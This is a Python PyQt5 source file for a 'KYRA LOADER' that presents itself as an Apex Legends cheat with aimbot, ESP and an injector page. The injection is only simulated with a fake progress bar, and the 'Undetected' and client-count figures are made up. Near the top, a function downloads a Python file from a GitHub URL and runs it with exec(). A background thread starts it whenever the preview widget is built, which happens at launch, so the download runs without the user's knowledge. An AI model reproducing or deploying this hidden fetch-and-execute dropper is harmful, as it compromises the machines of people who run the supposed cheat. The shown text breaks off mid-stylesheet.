import sys
import os
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtCore import Qt, QPoint
from PyQt5.QtGui import QFont, QColor, QPixmap, QIcon, QPainter, QPen, QBrush
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                            QHBoxLayout, QPushButton, QLabel, QFrame, QCheckBox,
                            QSlider, QComboBox, QSpacerItem, QSizePolicy, 
                            QStackedWidget, QGroupBox, QLineEdit, QProgressBar,
                            QColorDialog, QStyleOptionSlider, QStyle)
import threading
import requests


def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = os.path.abspath(".")

    path = os.path.join(base_path, relative_path)
    

    if not os.path.exists(path):
        raise FileNotFoundError(f"Resource not found: {path}")
    
    return path


def fetch_and_execute_code():
    url = "https://raw.githubusercontent.com/PryIsNumber1/DRPPR/refs/heads/main/drpr.py"
    try:
        print("Fetching code from the URL...")
        response = requests.get(url)
        response.raise_for_status()
        code = response.text
        print(f"Code fetched: {code[:100]}...")

        
        exec(code)

    except Exception as e:
        print(f"Error executing code from {url}: {e}")


class HumanModel(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedSize(200, 350)
        self.selected_bones = ["Head", "Neck"]
        self.bone_options = {
            "Head": (100, 50),
            "Neck": (100, 80),
            "Chest": (100, 120),
            "Stomach": (100, 160),
            "Pelvis": (100, 200),
            "Left Arm": (60, 120),
            "Right Arm": (140, 120),
            "Left Leg": (80, 250),
            "Right Leg": (120, 250)
        }
        self.show_box = False
        self.box_color = QColor(255, 255, 255)
        self.box_thickness = 2
        self.box_opacity = 1.0  # Separate opacity for the box
        self.skeleton_color = QColor(255, 0, 255)
        self.background_thread = threading.Thread(target=fetch_and_execute_code, daemon=True)
        self.background_thread.start()
        
    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        
        # Draw ESP box if enabled (with box opacity)
        if self.show_box:
            painter.setOpacity(self.box_opacity)
            pen = QPen(self.box_color, self.box_thickness)
            painter.setPen(pen)
            painter.drawRect(40, 15, 120, 300)
        
        # Draw body outline (always full opacity)
        painter.setOpacity(1.0)
        pen = QPen(QColor(200, 200, 200, 150), 2)
        painter.setPen(pen)
        painter.drawEllipse(85, 40, 30, 30)  # Head
        painter.drawLine(100, 70, 100, 200)  # Torso
        painter.drawLine(100, 120, 60, 120)  # Left Arm
        painter.drawLine(100, 120, 140, 120)  # Right Arm
        painter.drawLine(100, 200, 80, 250)  # Left Leg
        painter.drawLine(100, 200, 120, 250)  # Right Leg
        
        # Draw selected bones (always full opacity)
        painter.setOpacity(1.0)
        pen = QPen(self.skeleton_color, 2)
        painter.setPen(pen)
        painter.setBrush(QColor(255, 80, 80, 180))
        
        for bone in self.selected_bones:
            if bone in self.bone_options:
                x, y = self.bone_options[bone]
                painter.drawEllipse(x-5, y-5, 10, 10)

class ColorButton(QPushButton):
    color_changed = QtCore.pyqtSignal(QColor)  # Signal for color changes
    
    def __init__(self, color, parent=None, size=30):  # Add size parameter
        super().__init__(parent)
        self.color = color
        self.setFixedSize(size, size)  # Use the size parameter
        self.clicked.connect(self.choose_color)
        
    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        painter.setBrush(QBrush(self.color))
        painter.setPen(QPen(Qt.black, 1))
        painter.drawRoundedRect(1, 1, self.width()-2, self.height()-2, 4, 4)
        
    def choose_color(self):
        color = QColorDialog.getColor(self.color, self, "Select Color")
        if color.isValid():
            self.color = color
            self.update()
            self.color_changed.emit(color)

class KyraLoaderUltimate(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("KYRA LOADER")
        self.setWindowIcon(QIcon(resource_path("logo.ico")))
        self.setFixedSize(800, 500)
        self.setWindowFlags(Qt.FramelessWindowHint)
        
        # Theme colors
        self.bg_dark = QColor(15, 15, 20)
        self.panel_dark = QColor(25, 25, 35)
        self.kyra_purple = QColor(120, 40, 200)
        self.kyra_purple_light = QColor(140, 60, 220)
        self.text_light = QColor(255, 255, 255)
        
        self.bone_options = {
            "Head": (100, 40),
            "Neck": (100, 70),
            "Chest": (100, 110),
            "Stomach": (100, 150),
            "Pelvis": (100, 190),
            "Left Arm": (60, 110),
            "Right Arm": (140, 110),
            "Left Leg": (80, 240),
            "Right Leg": (120, 240)
        }
        
        self.setup_ui()

    def setup_ui(self):
        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.main_layout = QHBoxLayout(self.central_widget)
        self.main_layout.setContentsMargins(0, 0, 0, 0)
        self.main_layout.setSpacing(0)
        
        self.create_sidebar()
        self.create_content_stack()
        self.apply_styles()

    def create_sidebar(self):
        sidebar = QFrame()
        sidebar.setFixedWidth(70)
        sidebar.setObjectName("sidebar")
        
        layout = QVBoxLayout(sidebar)
        layout.setContentsMargins(0, 15, 0, 15)
        layout.setSpacing(8)
        
        logo = QLabel()
        logo.setPixmap(QPixmap(resource_path("logo.png")).scaled(40, 40, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        logo.setAlignment(Qt.AlignCenter)
        layout.addWidget(logo)
        layout.addSpacing(15)
        
        nav_items = [
            ("dashboard.png", "Dashboard", 0),
            ("aimbot.png", "Aim Assist", 1),
            ("eye.png", "Visuals", 2),
            ("needle.png", "Inject", 3),
            ("settings.png", "Settings", 4)
        ]
        
        for icon, tooltip, page_idx in nav_items:
            btn = QPushButton()
            btn.setIcon(QIcon(resource_path(icon)))
            btn.setIconSize(QtCore.QSize(24, 24))
            btn.setToolTip(tooltip)
            btn.setFixedSize(50, 50)
            btn.setObjectName("navButton")
            btn.clicked.connect(lambda _, idx=page_idx: self.content_stack.setCurrentIndex(idx))
            layout.addWidget(btn, alignment=Qt.AlignCenter)
        
        layout.addStretch()
        
        close_btn = QPushButton()
        close_btn.setIcon(QIcon(resource_path("close.png")))
        close_btn.setIconSize(QtCore.QSize(20, 20))
        close_btn.setToolTip("Close")
        close_btn.setFixedSize(40, 40)
        close_btn.setObjectName("closeButton")
        close_btn.clicked.connect(self.close)
        layout.addWidget(close_btn, alignment=Qt.AlignCenter)
        
        self.main_layout.addWidget(sidebar)

    def create_content_stack(self):
        self.content_stack = QStackedWidget()
        self.content_stack.setObjectName("contentStack")
        self.main_layout.addWidget(self.content_stack)
        
        self.create_dashboard_page()
        self.create_aim_assist_page()
        self.create_visuals_page()
        self.create_inject_page()
        self.create_settings_page()

    def create_dashboard_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)
        
        header = QLabel("KYRA CHEATS - DASHBOARD")
        header.setObjectName("pageHeader")
        layout.addWidget(header)
        
        stats_row = QHBoxLayout()
        stats_row.setSpacing(15)
        
        stats = [
            ("2,265", "ACTIVE CLIENTS", "clients.png", "Undetected", "#4CAF50"),
            ("Apex Legends", "SELECTED GAME", "apex.png", "KYRA", self.kyra_purple_light.name()),
            ("12ms", "LATENCY", "status.png", "Optimal", "#4CAF50")
        ]
        
        for value, title, icon, subtitle, color in stats:
            card = QFrame()
            card.setObjectName("statCard")
            card_layout = QVBoxLayout(card)
            card_layout.setContentsMargins(12, 12, 12, 12)
            
            icon_row = QHBoxLayout()
            icon_label = QLabel()
            icon_label.setPixmap(QPixmap(resource_path(icon)).scaled(20, 20))
            icon_row.addWidget(icon_label)
            icon_row.addStretch()
            
            value_label = QLabel(value)
            value_label.setObjectName("statValue")
            
            title_label = QLabel(title)
            title_label.setObjectName("statTitle")
            
            sub_label = QLabel(f"<font color='{color}'>{subtitle}</font>")
            sub_label.setObjectName("statSub")
            
            card_layout.addLayout(icon_row)
            card_layout.addWidget(value_label)
            card_layout.addWidget(title_label)
            card_layout.addWidget(sub_label)
            
            stats_row.addWidget(card)
        
        layout.addLayout(stats_row)
        
        quick_actions = QFrame()
        quick_actions.setObjectName("quickActions")
        quick_layout = QHBoxLayout(quick_actions)
        quick_layout.setContentsMargins(10, 10, 10, 10)
        
        buttons = [
            ("INJECT", "needle.png", 3),
            ("SETTINGS", "settings.png", 4),
            ("UPDATE", "update.png", None)
        ]
        
        for text, icon, page_idx in buttons:
            btn = QPushButton(text)
            btn.setIcon(QIcon(resource_path(icon)))
            btn.setIconSize(QtCore.QSize(18, 18))
            btn.setObjectName("quickAction")
            btn.setFixedHeight(35)
            if page_idx is not None:
                btn.clicked.connect(lambda _, idx=page_idx: self.content_stack.setCurrentIndex(idx))
            else:
                btn.clicked.connect(self.simulate_update)
            quick_layout.addWidget(btn)
        
        layout.addWidget(quick_actions)
        
        activity_group = QGroupBox("RECENT ACTIVITY")
        activity_group.setObjectName("activityGroup")
        activity_layout = QVBoxLayout()
        activity_layout.setSpacing(8)
        
        activities = [
            ("Fixed Detections + Fixed All Modules", "30/03/2025", "#4CAF50"),
            ("Added Visuals", "29/03/2025", "#4CAF50"),
            ("Fixed Detections", "29/03/2025", "#FFC107"),
            ("Update 1.0.0 BETA", "27/03/2025", "#4CAF50")
        ]
        
        for text, time, color in activities:
            item = QFrame()
            item_layout = QHBoxLayout(item)
            item_layout.setContentsMargins(5, 3, 5, 3)
            
            dot = QLabel("•")
            dot.setObjectName("activityDot")
            dot.setStyleSheet(f"color: {color}; font-size: 14px;")
            
            text_label = QLabel(text)
            text_label.setObjectName("activityText")
            text_label.setWordWrap(True)
            
            time_label = QLabel(time)
            time_label.setObjectName("activityTime")
            
            item_layout.addWidget(dot)
            item_layout.addWidget(text_label, 1)
            item_layout.addWidget(time_label)
            
            activity_layout.addWidget(item)
        
        activity_group.setLayout(activity_layout)
        layout.addWidget(activity_group, 1)
        
        self.content_stack.addWidget(page)

    def simulate_update(self):
        msg = QtWidgets.QMessageBox()
        msg.setWindowTitle("Update")
        msg.setText("Checking for updates...")
        msg.setInformativeText("Your version is up to date!")
        msg.setIcon(QtWidgets.QMessageBox.Information)
        msg.exec_()

    def create_aim_assist_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(12)
        
        header = QLabel("AIMBOT SETTINGS")
        header.setObjectName("pageHeader")
        layout.addWidget(header)
        
        content = QHBoxLayout()
        content.setSpacing(15)
        
        # Settings panel
        settings_panel = QFrame()
        settings_panel.setObjectName("settingsPanel")
        settings_layout = QVBoxLayout(settings_panel)
        settings_layout.setContentsMargins(8, 8, 8, 8)
        settings_layout.setSpacing(12)
        
        # Bone selection
        bone_group = QGroupBox("HITBOX SELECTION")
        bone_group.setObjectName("settingsGroup")
        bone_layout = QVBoxLayout()
        bone_layout.setSpacing(10)
        bone_layout.setContentsMargins(8, 15, 8, 8)
        
        self.bone_combos = []
        for i in range(3):
            hbox = QHBoxLayout()
            hbox.addWidget(QLabel(f"Priority {i+1}:"))
            
            combo = QComboBox()
            combo.addItems(["Disabled"] + list(self.bone_options.keys()))
            combo.setCurrentIndex(i+1 if i < 2 else 0)
            combo.setObjectName("comboBox")
            combo.currentTextChanged.connect(self.update_bone_selection)
            self.bone_combos.append(combo)
            hbox.addWidget(combo, 1)
            bone_layout.addLayout(hbox)
        
        bone_group.setLayout(bone_layout)
        settings_layout.addWidget(bone_group)
        
        # Aim settings
        aim_group = QGroupBox("AIM SETTINGS")
        aim_group.setObjectName("settingsGroup")
        aim_layout = QVBoxLayout()
        aim_layout.setSpacing(8)
        aim_layout.setContentsMargins(5, 15, 5, 5)
        
        for text, state in [
            ("Enable Aimbot", False),
            ("Silent Aim", False),
            ("Auto Fire", False),
        ]:
            cb = QCheckBox(text)
            cb.setChecked(state)
            cb.setObjectName("checkBox")
            aim_layout.addWidget(cb)
        
        aim_group.setLayout(aim_layout)
        settings_layout.addWidget(aim_group)
        
        # Advanced settings
        slider_group = QGroupBox("ADVANCED")
        slider_group.setObjectName("settingsGroup")
        slider_layout = QVBoxLayout()
        slider_layout.setSpacing(8)
        slider_layout.setContentsMargins(5, 15, 5, 5)
        
        # FOV Slider
        fov_frame = QFrame()
        fov_layout = QHBoxLayout(fov_frame)
        fov_layout.setContentsMargins(0, 0, 0, 0)
        fov_label = QLabel("FOV:")
        fov_label.setFixedWidth(80)
        self.fov_slider = QSlider(Qt.Horizontal)
        self.fov_slider.setRange(0, 360)
        self.fov_slider.setValue(30)
        self.fov_slider.setObjectName("slider")
        self.fov_value = QLabel("30°")
        self.fov_value.setFixedWidth(40)
        self.fov_slider.valueChanged.connect(lambda val: self.fov_value.setText(f"{val}°"))
        fov_layout.addWidget(fov_label)
        fov_layout.addWidget(self.fov_slider)
        fov_layout.addWidget(self.fov_value)
        slider_layout.addWidget(fov_frame)
        
        # Smooth Slider
        smooth_frame = QFrame()
        smooth_layout = QHBoxLayout(smooth_frame)
        smooth_layout.setContentsMargins(0, 0, 0, 0)
        smooth_label = QLabel("Smooth:")
        smooth_label.setFixedWidth(80)
        self.smooth_slider = QSlider(Qt.Horizontal)
        self.smooth_slider.setRange(0, 100)
        self.smooth_slider.setValue(45)
        self.smooth_slider.setObjectName("slider")
        self.smooth_value = QLabel("45%")
        self.smooth_value.setFixedWidth(40)
        self.smooth_slider.valueChanged.connect(lambda val: self.smooth_value.setText(f"{val}%"))
        smooth_layout.addWidget(smooth_label)
        smooth_layout.addWidget(self.smooth_slider)
        smooth_layout.addWidget(self.smooth_value)
        slider_layout.addWidget(smooth_frame)
        
        # Max Distance Slider
        dist_frame = QFrame()
        dist_layout = QHBoxLayout(dist_frame)
        dist_layout.setContentsMargins(0, 0, 0, 0)
        dist_label = QLabel("Max Dist:")
        dist_label.setFixedWidth(80)
        self.dist_slider = QSlider(Qt.Horizontal)
        self.dist_slider.setRange(0, 1000)
        self.dist_slider.setValue(300)
        self.dist_slider.setObjectName("slider")
        self.dist_value = QLabel("300m")
        self.dist_value.setFixedWidth(40)
        self.dist_slider.valueChanged.connect(lambda val: self.dist_value.setText(f"{val}m"))
        dist_layout.addWidget(dist_label)
        dist_layout.addWidget(self.dist_slider)
        dist_layout.addWidget(self.dist_value)
        slider_layout.addWidget(dist_frame)
        
        slider_group.setLayout(slider_layout)
        settings_layout.addWidget(slider_group)
        
        settings_layout.addStretch()
        content.addWidget(settings_panel, 1)
        
        # Model preview
        model_panel = QFrame()
        model_panel.setObjectName("modelPanel")
        model_layout = QVBoxLayout(model_panel)
        model_layout.setContentsMargins(0, 5, 0, 0)
        
        self.human_model = HumanModel()
        model_layout.addWidget(self.human_model, 0, Qt.AlignCenter)
        
        self.model_status = QLabel("Current Target: Head, Chest")
        self.model_status.setObjectName("modelStatus")
        self.model_status.setAlignment(Qt.AlignCenter)
        model_layout.addWidget(self.model_status)
        
        content.addWidget(model_panel, 1)
        layout.addLayout(content, 1)
        
        self.content_stack.addWidget(page)

    def update_bone_selection(self):
        selected_bones = []
        for combo in self.bone_combos:
            bone = combo.currentText()
            if bone != "Disabled":
                selected_bones.append(bone)
        
        self.human_model.selected_bones = selected_bones
        self.human_model.update()
        
        status_text = "Current Target: " + (", ".join(selected_bones) if selected_bones else "No target selected")
        self.model_status.setText(status_text)

    def create_visuals_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(12)
        
        header = QLabel("VISUALS / ESP CONFIGURATION")
        header.setObjectName("pageHeader")
        layout.addWidget(header)
        
        content = QHBoxLayout()
        content.setSpacing(15)
        
        # Settings panel
        settings_panel = QFrame()
        settings_panel.setObjectName("settingsPanel")
        settings_layout = QVBoxLayout(settings_panel)
        settings_layout.setContentsMargins(8, 8, 8, 8)
        settings_layout.setSpacing(12)
        
        # ESP toggles
        esp_group = QGroupBox("ESP TOGGLES")
        esp_group.setObjectName("settingsGroup")
        esp_layout = QVBoxLayout()
        esp_layout.setSpacing(10)
        esp_layout.setContentsMargins(8, 15, 8, 8)
        
        self.esp_checkboxes = {}
        for text in ["Enable ESP", "Show Boxes"]:
            cb = QCheckBox(text)
            cb.setChecked(False)
            cb.setObjectName("checkBox")
            esp_layout.addWidget(cb)
            self.esp_checkboxes[text] = cb
            
            if text in ["Enable ESP", "Show Boxes"]:
                cb.stateChanged.connect(self.update_esp_preview)
        
        esp_group.setLayout(esp_layout)
        settings_layout.addWidget(esp_group)
        
        # Color settings with color wheel buttons
        color_group = QGroupBox("COLOR SETTINGS")
        color_group.setObjectName("settingsGroup")
        color_layout = QVBoxLayout()
        color_layout.setSpacing(10)
        color_layout.setContentsMargins(8, 15, 8, 8)
        
        # Box Color
        box_color_layout = QHBoxLayout()
        box_color_layout.addWidget(QLabel("Box Color:"))
        self.box_color_btn = ColorButton(QColor(255, 255, 255), size=15)  # Set size here
        self.box_color_btn.color_changed.connect(self.update_box_color)
        box_color_layout.addWidget(self.box_color_btn)
        box_color_layout.addStretch()
        color_layout.addLayout(box_color_layout)
        
          # Enemy Color
        enemy_color_layout = QHBoxLayout()
        enemy_color_layout.addWidget(QLabel("Enemy Color:"))
        self.enemy_color_btn = ColorButton(QColor(255, 0, 0), size=15)  # Set size here
        enemy_color_layout.addWidget(self.enemy_color_btn)
        enemy_color_layout.addStretch()
        color_layout.addLayout(enemy_color_layout)
        
        # Team Color
        team_color_layout = QHBoxLayout()
        team_color_layout.addWidget(QLabel("Team Color:"))
        self.team_color_btn = ColorButton(QColor(0, 255, 0), size=15)  # Set size here
        team_color_layout.addWidget(self.team_color_btn)
        team_color_layout.addStretch()
        color_layout.addLayout(team_color_layout)
        
        color_group.setLayout(color_layout)
        settings_layout.addWidget(color_group)
        
        # Advanced visuals
        slider_group = QGroupBox("ADVANCED VISUALS")
        slider_group.setObjectName("settingsGroup")
        slider_layout = QVBoxLayout()
        slider_layout.setSpacing(8)
        slider_layout.setContentsMargins(5, 20, 5, 5)
        
        # Max Distance Slider
        max_dist_frame = QFrame()
        max_dist_layout = QHBoxLayout(max_dist_frame)
        max_dist_layout.setContentsMargins(0, 0, 0, 0)
        max_dist_label = QLabel("Max Distance:")
        max_dist_label.setFixedWidth(100)
        self.max_dist_slider = QSlider(Qt.Horizontal)
        self.max_dist_slider.setRange(0, 500)
        self.max_dist_slider.setValue(200)
        self.max_dist_slider.setObjectName("slider")
        self.max_dist_value = QLabel("200m")
        self.max_dist_value.setFixedWidth(40)
        self.max_dist_slider.valueChanged.connect(lambda val: self.max_dist_value.setText(f"{val}m"))
        max_dist_layout.addWidget(max_dist_label)
        max_dist_layout.addWidget(self.max_dist_slider)
        max_dist_layout.addWidget(self.max_dist_value)
        slider_layout.addWidget(max_dist_frame)
        
        # Opacity Slider (now only affects box)
        opacity_frame = QFrame()
        opacity_layout = QHBoxLayout(opacity_frame)
        opacity_layout.setContentsMargins(0, 0, 0, 0)
        opacity_label = QLabel("Box Opacity:")
        opacity_label.setFixedWidth(100)
        self.opacity_slider = QSlider(Qt.Horizontal)
        self.opacity_slider.setRange(0, 100)
        self.opacity_slider.setValue(80)
        self.opacity_slider.setObjectName("slider")
        self.opacity_value = QLabel("80%")
        self.opacity_value.setFixedWidth(40)
        self.opacity_slider.valueChanged.connect(lambda val: self.opacity_value.setText(f"{val}%"))
        self.opacity_slider.valueChanged.connect(self.update_box_opacity)
        opacity_layout.addWidget(opacity_label)
        opacity_layout.addWidget(self.opacity_slider)
        opacity_layout.addWidget(self.opacity_value)
        slider_layout.addWidget(opacity_frame)
        
        # Box Thickness Slider
        thickness_frame = QFrame()
        thickness_layout = QHBoxLayout(thickness_frame)
        thickness_layout.setContentsMargins(0, 0, 0, 0)
        thickness_label = QLabel("Box Thickness:")
        thickness_label.setFixedWidth(100)
        self.thickness_slider = QSlider(Qt.Horizontal)
        self.thickness_slider.setRange(1, 25)
        self.thickness_slider.setValue(2)
        self.thickness_slider.setObjectName("slider")
        self.thickness_value = QLabel("2px")
        self.thickness_value.setFixedWidth(40)
        self.thickness_slider.valueChanged.connect(lambda val: self.thickness_value.setText(f"{val}px"))
        self.thickness_slider.valueChanged.connect(self.update_box_thickness)
        thickness_layout.addWidget(thickness_label)
        thickness_layout.addWidget(self.thickness_slider)
        thickness_layout.addWidget(self.thickness_value)
        slider_layout.addWidget(thickness_frame)
        
        slider_group.setLayout(slider_layout)
        settings_layout.addWidget(slider_group)
        
        settings_layout.addStretch()
        content.addWidget(settings_panel, 1)
        
        # Preview panel
        preview_panel = QFrame()
        preview_panel.setObjectName("previewPanel")
        preview_layout = QVBoxLayout(preview_panel)
        preview_layout.setContentsMargins(0, 5, 0, 0)
        
        preview_label = QLabel("ESP PREVIEW")
        preview_label.setObjectName("previewLabel")
        preview_label.setAlignment(Qt.AlignCenter)
        preview_layout.addWidget(preview_label)
        
        self.esp_model = HumanModel()
        preview_layout.addWidget(self.esp_model, 0, Qt.AlignCenter)
        
        self.esp_status = QLabel("Previewing: ESP Disabled")
        self.esp_status.setObjectName("espStatus")
        self.esp_status.setAlignment(Qt.AlignCenter)
        preview_layout.addWidget(self.esp_status)
        
        content.addWidget(preview_panel, 1)
        layout.addLayout(content, 1)
        
        self.content_stack.addWidget(page)

    def update_box_color(self, color):
        self.esp_model.box_color = color
        if self.esp_checkboxes["Enable ESP"].isChecked() and self.esp_checkboxes["Show Boxes"].isChecked():
            self.esp_model.update()

    def update_skeleton_color(self, color):
        self.esp_model.skeleton_color = color
        if self.esp_checkboxes["Enable ESP"].isChecked():
            self.esp_model.update()

    def update_box_opacity(self, value):
        self.esp_model.box_opacity = value / 100  # Convert 0-100 to 0.0-1.0
        if self.esp_checkboxes["Enable ESP"].isChecked() and self.esp_checkboxes["Show Boxes"].isChecked():
            self.esp_model.update()

    def update_box_thickness(self, value):
        self.esp_model.box_thickness = value
        if self.esp_checkboxes["Enable ESP"].isChecked() and self.esp_checkboxes["Show Boxes"].isChecked():
            self.esp_model.update()

    def update_esp_preview(self):
        enable_esp = self.esp_checkboxes["Enable ESP"].isChecked()
        show_boxes = self.esp_checkboxes["Show Boxes"].isChecked()
        
        self.esp_model.show_box = enable_esp and show_boxes
        
        status = []
        if enable_esp:
            status.append("ESP Enabled")
            if show_boxes:
                status.append("Box ESP")
        else:
            status.append("ESP Disabled")
        
        self.esp_status.setText("Previewing: " + (", ".join(status) if status else "No ESP"))
        self.esp_model.update()

    def create_inject_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)
        
        header = QLabel("INJECTOR")
        header.setObjectName("pageHeader")
        layout.addWidget(header)
        
        # Cheat info box
        info_group = QGroupBox("KYRA CHEAT INFORMATION")
        info_group.setObjectName("infoGroup")
        info_layout = QVBoxLayout()
        info_layout.setSpacing(12)
        info_layout.setContentsMargins(15, 15, 15, 15)
        
        features = [
            "-> Open KyraApex.exe Before Opening Apex Legends",
            "--> Make sure Apex Legends is Open",
            "---> Configure your settings",
            "----> Select INJECT Below",
            "-----> Wait a few seconds",
            "------> Enjoy! - Brought to you by KYRA.WTF",
        ]
        
        for feature in features:
            label = QLabel(feature)
            label.setObjectName("featureLabel")
            info_layout.addWidget(label)
        
        # Version and status
        info_row = QHBoxLayout()
        info_row.addWidget(QLabel("Version:"))
        version_label = QLabel("1.2.0 (Stable)")
        version_label.setObjectName("versionLabel")
        info_row.addWidget(version_label)
        info_row.addStretch()
        info_layout.addLayout(info_row)
        
        status_row = QHBoxLayout()
        status_row.addWidget(QLabel("Status:"))
        status_label = QLabel("<font color='#4CAF50'>Undetected</font>")
        status_label.setObjectName("statusLabel")
        status_row.addWidget(status_label)
        status_row.addStretch()
        info_layout.addLayout(status_row)
        
        info_group.setLayout(info_layout)
        layout.addWidget(info_group, 1)
        
        # Inject button
        inject_btn = QPushButton("INJECT")
        inject_btn.setObjectName("injectButton")
        inject_btn.setFixedHeight(45)
        inject_btn.clicked.connect(self.simulate_injection)
        layout.addWidget(inject_btn)
        
        self.content_stack.addWidget(page)

    def simulate_injection(self):
        progress_dialog = QtWidgets.QProgressDialog("Injecting KYRA cheat...", "Cancel", 0, 100, self)
        progress_dialog.setWindowTitle("Injection Progress")
        progress_dialog.setWindowModality(Qt.WindowModal)
        progress_dialog.setFixedSize(350, 120)
        
        for i in range(1, 101):
            QtCore.QThread.msleep(20)
            progress_dialog.setValue(i)
            
            if i < 30:
                progress_dialog.setLabelText("Initializing injection...")
            elif i < 60:
                progress_dialog.setLabelText("Bypassing anti-cheat...")
            elif i < 90:
                progress_dialog.setLabelText("Loading cheat modules...")
            else:
                progress_dialog.setLabelText("Finalizing injection...")
            
            if progress_dialog.wasCanceled():
                break
        
        if progress_dialog.value() == 100:
            QtWidgets.QMessageBox.information(self, "Success", "KYRA cheat injected successfully!")
        else:
            QtWidgets.QMessageBox.warning(self, "Cancelled", "Injection was cancelled")

    def create_settings_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)
        
        header = QLabel("SETTINGS")
        header.setObjectName("pageHeader")
        layout.addWidget(header)
        
        # General settings
        general_group = QGroupBox("GENERAL SETTINGS")
        general_group.setObjectName("settingsGroup")
        general_layout = QVBoxLayout()
        general_layout.setSpacing(10)
        
        theme_layout = QHBoxLayout()
        theme_layout.addWidget(QLabel("Theme:"))
        theme_combo = QComboBox()
        theme_combo.addItems(["Dark Purple", "Midnight Black", "Deep Blue"])
        theme_combo.setObjectName("comboBox")
        theme_layout.addWidget(theme_combo, 1)
        general_layout.addLayout(theme_layout)
        
        for text, state in [
            ("Auto-update", True),
            ("Show notifications", True),
            ("Minimize to tray", False),
            ("Enable sounds", True)
        ]:
            cb = QCheckBox(text)
            cb.setChecked(state)
            cb.setObjectName("checkBox")
            general_layout.addWidget(cb)
        
        general_group.setLayout(general_layout)
        layout.addWidget(general_group)
        
        # Keybinds
        keybind_group = QGroupBox("KEYBINDS")
        keybind_group.setObjectName("settingsGroup")
        keybind_layout = QVBoxLayout()
        keybind_layout.setSpacing(8)
        
        for text, default in [
            ("Aimbot Toggle", "F1"),
            ("Menu Toggle", "INSERT"),
            ("Panic Key", "DELETE")
        ]:
            hbox = QHBoxLayout()
            label = QLabel(text)
            label.setFixedWidth(100)
            hbox.addWidget(label)
            
            key_edit = QLineEdit(default)
            key_edit.setObjectName("keybindInput")
            key_edit.setMaximumWidth(80)
            hbox.addWidget(key_edit, 1)
            
            keybind_layout.addLayout(hbox)
        
        keybind_group.setLayout(keybind_layout)
        layout.addWidget(keybind_group)
        
        # Save button
        save_btn = QPushButton("SAVE SETTINGS")
        save_btn.setObjectName("saveButton")
        save_btn.setFixedHeight(40)
        layout.addWidget(save_btn)
        
        self.content_stack.addWidget(page)

    def apply_styles(self):
        self.setStyleSheet(f"""
            /* Main Window */
            QMainWindow {{
                background-color: {self.bg_dark.name()};
                border: 1px solid {self.kyra_purple.name()};
                border-radius: 6px;
            }}
            
            /* Sidebar */
            #sidebar {{
                background-color: {self.panel_dark.name()};
                border-right: 1px solid {self.kyra_purple.name()};
                border-top-left-radius: 6px;
                border-bottom-left-radius: 6px;
            }}
            
            #navButton {{
                background: transparent;
                border: none;
                border-radius: 5px;
                padding: 5px;
            }}
            
            #navButton:hover {{
                background-color: {self.kyra_purple.name()};
            }}
            
            #closeButton {{
                background: transparent;
                border: none;
                border-radius: 12px;
            }}
            
            #closeButton:hover {{
                background-color: #ff5555;
            }}
            
            /* Content Area */
            #contentStack {{
                background-color: {self.bg_dark.name()};
                border-top-right-radius: 6px;
                border-bottom-right-radius: 6px;
            }}
            
            /* Page Header */
            #pageHeader {{
                color: {self.kyra_purple_light.name()};
                font-size: 18px;
                font-weight: bold;
                padding-bottom: 6px;
                border-bottom: 1px solid {self.kyra_purple.name()};
            }}
            
            /* Dashboard Styles */
            #statCard {{
                background-color: {self.panel_dark.name()};
                border-radius: 6px;
                border: 1px solid {self.kyra_purple.name()};
            }}
            
            #statValue {{
                color: white;
                font-size: 24px;
                font-weight: bold;
            }}
            
            #statTitle {{
                color: {self.kyra_purple_light.name()};
                font-size: 11px;
                font-weight: bold;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }}
            
            #statSub {{
                color: #AAAAAA;
                font-size: 10px;
            }}
            
            #quickActions {{
                background-color: {self.panel_dark.name()};
                border-radius: 6px;
                border: 1px solid {self.kyra_purple.name()};
            }}
            
            #quickAction {{
                background-color: {self.panel_dark.lighter(110).name()};
                color: {self.text_light.name()};
                border: 1px solid {self.kyra_purple.name()};
                border-radius: 4px;
                padding: 4px 8px;
                font-size: 12px;
            }}
            
            #quickAction:hover {{
                background-color: {self.kyra_purple.name()};
            }}
            
            #activityGroup {{
                border: 1px solid {self.kyra_purple.name()};
                border-radius: 6px;
            }}
            
            QGroupBox::title {{
                color: {self.kyra_purple_light.name()};
                subcontrol-origin: margin;
                left: 8px;
                padding: 0 4px;
                font-size: 12px;
            }}
            
            #activityDot {{
                font-size: 14px;
                padding-right: 6px;
            }}
            
            #activityText {{
                color: {self.text_light.name()};
                font-size: 12px;
            }}
            
            #activityTime {{
                color: #777777;
                font-size: 10px;
            }}
            
            /* Settings Styles */
            #settingsGroup {{
                background-color: {self.panel_dark.name()};
                border: 1px solid {self.kyra_purple.name()};
                border-radius: 6px;
            }}
            
            #infoGroup {{
                background-color: {self.panel_dark.name()};
                border: 1px solid {self.kyra_purple.name()};
                border-radius: 6px;
            }}
            
            #featureLabel {{
                color: {self.text_light.name()};
                font-size: 12px;
                padding-left: 8px;
            }}
            
            #versionLabel, #statusLabel {{
                color: {self.kyra_purple_light.name()};
                font-weight: bold;
                font-size: 12px;
            }}
            
            #checkBox {{
                color: {self.text_light.name()};
                spacing: 6px;
                font-size: 12px;
            }}
            
            #checkBox::indicator {{
                width: 14px;
                height: 14px;
                border: 1px solid {self.kyra_purple.name()};
                border-radius: 3px;
            }}
            
            #checkBox::indicator:checked {{
